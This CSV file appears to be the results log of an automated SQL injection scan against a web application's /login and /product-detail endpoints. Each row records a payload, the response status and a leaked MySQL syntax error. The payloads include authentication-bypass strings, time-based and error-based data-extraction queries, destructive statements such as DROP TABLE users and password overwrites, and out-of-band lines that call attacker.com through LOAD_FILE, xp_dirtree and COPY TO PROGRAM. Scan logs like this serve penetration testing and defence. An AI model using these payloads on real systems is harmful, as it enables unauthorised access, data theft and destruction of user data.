Type,Vulnerability,Endpoint,Method,Parameter,Status Code,Severity,Payload,Evidence
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' AND 1=2--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR SLEEP(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; SELECT SLEEP(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR pg_sleep(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; SELECT pg_sleep(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; WAITFOR DELAY '00:00:05'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; WAITFOR DELAY '0:0:5'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' UNION SELECT NULL--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT NULL,NULL--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT NULL,NULL,NULL--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT 1,2,3--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT user(),database(),version()--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' AND CAST((SELECT version()) AS int)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' AND 1=CAST((SELECT user) AS int)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND CONVERT(int, (SELECT @@version))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND 1=CONVERT(int, (SELECT user_name()))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; DROP TABLE users--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; DROP TABLE users--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,admin'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Boolean-based Blind SQLi,/login,POST,username,200,Medium,admin' OR '1'='1,응답 내용 변화 감지
SQL Injection,Error-based SQLi,/login,POST,username,400,High,test' UNION SELECT * FROM users--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; EXEC xp_dirtree '\\attacker.com\test'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND ASCII(SUBSTR((SELECT user()),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND ASCII(SUBSTR((SELECT database()),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND ASCII(SUBSTR((SELECT version()),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a'--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND IF(ASCII(SUBSTR((SELECT user()),1,1))>64,SLEEP(5),0)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(5),0)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND (CASE WHEN ASCII(SUBSTR((SELECT user),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1'; IF ASCII(SUBSTRING((SELECT user_name()),1,1))>64 WAITFOR DELAY '00:00:05'--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'/**/OR/**/1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'/**/OR/**/'1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'%09OR%091=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'%0AOR%0A1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR 1=1#,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR 1=1/*,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' Or '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' oR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR '1'='1'||'1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' OR CONCAT('1','=','1')--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' AND 1=2--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR SLEEP(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; SELECT SLEEP(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR pg_sleep(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; SELECT pg_sleep(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; WAITFOR DELAY '00:00:05'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; WAITFOR DELAY '0:0:5'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' UNION SELECT NULL--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' UNION SELECT NULL,NULL--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' UNION SELECT NULL,NULL,NULL--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' UNION SELECT 1,2,3--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' UNION SELECT user(),database(),version()--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' AND CAST((SELECT version()) AS int)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' AND 1=CAST((SELECT user) AS int)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND CONVERT(int, (SELECT @@version))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND 1=CONVERT(int, (SELECT user_name()))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; DROP TABLE users--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1'; INSERT INTO users(username,password) VALUES('test','test')--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; UPDATE users SET password='hacked' WHERE id=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; DROP TABLE users--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,admin'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Boolean-based Blind SQLi,/login,POST,password,200,Medium,admin' OR '1'='1,응답 내용 변화 감지
SQL Injection,Error-based SQLi,/login,POST,password,400,High,test' UNION SELECT * FROM users--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test.txt')))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; EXEC xp_dirtree '\\attacker.com\test'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'; COPY (SELECT version()) TO PROGRAM 'nslookup attacker.com'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND ASCII(SUBSTR((SELECT user()),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND ASCII(SUBSTR((SELECT database()),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND ASCII(SUBSTR((SELECT version()),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)='u'--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))>64--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a'--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND IF(ASCII(SUBSTR((SELECT user()),1,1))>64,SLEEP(5),0)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND IF(ASCII(SUBSTR((SELECT database()),1,1))>64,SLEEP(5),0)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' AND (CASE WHEN ASCII(SUBSTR((SELECT user),1,1))>64 THEN pg_sleep(5) ELSE pg_sleep(0) END)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1'; IF ASCII(SUBSTRING((SELECT user_name()),1,1))>64 WAITFOR DELAY '00:00:05'--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'/**/OR/**/1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'/**/OR/**/'1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'%09OR%091=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1'%0AOR%0A1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR 1=1#,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR 1=1/*,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' Or '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' oR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,1' OR '1'='1'||'1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,"1' OR CONCAT('1','=','1')--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,password,400,High,' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR '1'='1'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR 1=1--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' AND 1=2--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR SLEEP(5)--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; SELECT SLEEP(5)--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1' OR pg_sleep(5)--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; SELECT pg_sleep(5)--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/product-detail,POST,id,400,High,1'; WAITFOR DELAY '00:00:05'--,"<body><p>error: (1064, ""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
